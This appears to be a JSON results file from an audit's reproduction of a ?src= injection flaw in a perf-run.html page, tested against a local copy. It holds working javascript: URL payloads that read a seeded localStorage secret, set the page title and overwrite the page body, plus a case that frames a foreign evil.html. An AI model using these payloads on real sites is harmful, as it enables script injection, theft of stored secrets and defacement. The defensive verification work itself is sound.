@@ -1,0 +1,155 @@
+{
+ "what": "v-repro-rob: perf-run.html ?src= reproduced on a local copy",
+ "started": "2026-11-02T11:23:37.874Z",
+ "files": {
+  "perf-run.html (repo)": "3f57a5bf8135326d51099d87144d0e83",
+  "perf-run.html (copy)": "3f57a5bf8135326d51099d87144d0e83",
+  "perf-route.js (repo)": "c1323fa79e59ff143e709eca00b6e643",
+  "perf-route.js (copy)": "c1323fa79e59ff143e709eca00b6e643",
+  "build (copy)": "f10fe585c46aea576f436ed51ac46f83",
+  "perf-run-fixed.html": "762e7c2dfce0850c7f1c2315896d1904"
+ },
+ "cases": [
+  {
+   "id": "1 js-storage",
+   "url": "http://127.0.0.1:<A>/Austerlitz/tools/step6/perf-run.html?src=javascript%3Aparent.localStorage.setItem('vrr'%2Cparent.location.origin)%3Bparent.document.title%3D'VRR1%20'%2Bparent.location.origin%2B'%20'%2Bparent.location.pathname%3Bvoid%200",
+   "src": "javascript:parent.localStorage.setItem('vrr',parent.location.origin);parent.document.title='VRR1 '+parent.location.origin+' '+parent.location.pathname;void 0",
+   "origin": "http://127.0.0.1:<A>",
+   "title": "VRR1 http://127.0.0.1:<A> /Austerlitz/tools/step6/perf-run.html",
+   "ls": {
+    "vrr": "http://127.0.0.1:<A>",
+    "otherSecret": "s3cr3t-1793618617884"
+   },
+   "frameSrcAttr": "javascript:parent.localStorage.setItem('vrr',parent.location.origin);parent.document.title='VRR1 '+parent.location.origin+' '+parent.location.pathname;void 0",
+   "frameHref": "about:blank",
+   "frameRect": [
+    0,
+    0,
+    1280,
+    720
+   ],
+   "panelRect": [
+    0,
+    0,
+    1280,
+    205.5625
+   ],
+   "msg": "Loading the build…",
+   "goDisabled": true,
+   "phish": false,
+   "srcRejected": null,
+   "bodyStart": "\n<iframe id=\"app\" title=\"The built page under measurement\" src=\"javascript:paren",
+   "frames": [
+    {
+     "url": "about:blank"
+    }
+   ],
+   "foreignText": null,
+   "seconds": 4,
+   "log": []
+  },
+  {
+   "id": "2 js-crosspath",
+   "url": "http://127.0.0.1:<A>/Austerlitz/tools/step6/perf-run.html?src=javascript%3Aparent.document.title%3D'VRR2%20'%2Bparent.localStorage.getItem('otherSecret')%3Bvoid%200",
+   "src": "javascript:parent.document.title='VRR2 '+parent.localStorage.getItem('otherSecret');void 0",
+   "origin": "http://127.0.0.1:<A>",
+   "title": "VRR2 s3cr3t-1793618617884",
+   "ls": {
+    "vrr": "http://127.0.0.1:<A>",
+    "otherSecret": "s3cr3t-1793618617884"
+   },
+   "frameSrcAttr": "javascript:parent.document.title='VRR2 '+parent.localStorage.getItem('otherSecret');void 0",
+   "frameHref": "about:blank",
+   "frameRect": [
+    0,
+    0,
+    1280,
+    720
+   ],
+   "panelRect": [
+    0,
+    0,
+    1280,
+    205.5625
+   ],
+   "msg": "Loading the build…",
+   "goDisabled": true,
+   "phish": false,
+   "srcRejected": null,
+   "bodyStart": "\n<iframe id=\"app\" title=\"The built page under measurement\" src=\"javascript:paren",
+   "frames": [
+    {
+     "url": "about:blank"
+    }
+   ],
+   "foreignText": null,
+   "seconds": 4,
+   "log": []
+  },
+  {
+   "id": "3 js-dom",
+   "url": "http://127.0.0.1:<A>/Austerlitz/tools/step6/perf-run.html?src=javascript%3Aparent.document.body.innerHTML%3D'%3Ch1%20id%3Dvrr-phish%3Ereplaced%20by%20the%20link%3C%2Fh1%3E'%3Bvoid%200",
+   "src": "javascript:parent.document.body.innerHTML='<h1 id=vrr-phish>replaced by the link</h1>';void 0",
+   "origin": "http://127.0.0.1:<A>",
+   "title": "Frame-time route",
+   "ls": {
+    "vrr": "http://127.0.0.1:<A>",
+    "otherSecret": "s3cr3t-1793618617884"
+   },
+   "frameSrcAttr": "(no #app)",
+   "frameHref": null,
+   "frameRect": null,
+   "panelRect": null,
+   "msg": "(no #msg)",
+   "goDisabled": null,
+   "phish": true,
+   "srcRejected": null,
+   "bodyStart": "<h1 id=\"vrr-phish\">replaced by the link</h1>\n\n",
+   "frames": [],
+   "foreignText": null,
+   "seconds": 5,
+   "log": []
+  },
+  {
+   "id": "4 foreign",
+   "url": "http://127.0.0.1:<A>/Austerlitz/tools/step6/perf-run.html?src=http%3A%2F%2F127.0.0.1%3A36991%2Fevil.html",
+   "src": "http://127.0.0.1:<B>/evil.html",
+   "origin": "http://127.0.0.1:<A>",
+   "title": "Frame-time route",
+   "ls": {
+    "vrr": "http://127.0.0.1:<A>",
+    "otherSecret": "s3cr3t-1793618617884"
+   },
+   "frameSrcAttr": "http://127.0.0.1:<B>/evil.html",
+   "frameHref": "(cross-origin: SecurityError)",
+   "frameRect": [
+    0,
+    0,
+    1280,
+    720
+   ],
+   "panelRect": [
+    0,
+    0,
+    1280,
+    205.5625
+   ],
+   "msg": "Loading the build…",
+   "goDisabled": true,
+   "phish": false,
+   "srcRejected": null,
+   "bodyStart": "\n<iframe id=\"app\" title=\"The built page under measurement\" src=\"http://127.0.0.1",
+   "frames": [
+    {
+     "url": "http://127.0.0.1:<B>/evil.html"
+    }
+   ],
+   "foreignText": "FOREIGN CONTENT",
+   "seconds": 5,
+   "log": []
+  }
+ ],
+ "seeded": "s3cr3t-1793618617884",
+ "error": "page.goto: Timeout 60000ms exceeded.\nCall log:\n\u001b[2m  - navigating to \"http://127.0.0.1:38963/Austerlitz/tools/step6/perf-run-fixed.html?src=javascript%3Aparent.document.title%3D%27VRR5%20%27%2Bparent.location.origin%3Bvoid%200\", waiting until \"load\"\u001b[22m\n\n    at run (/home/user/Austerlitz/tools/audit-post8/verification/v-repro-rob/repro-src.js:51:16)\n    at async /home/user/Austerlitz/tools/audit-post8/verification/v-repro-rob/repro-src.js:73:5",
+ "finished": "2026-11-02T11:25:29.823Z"
+}
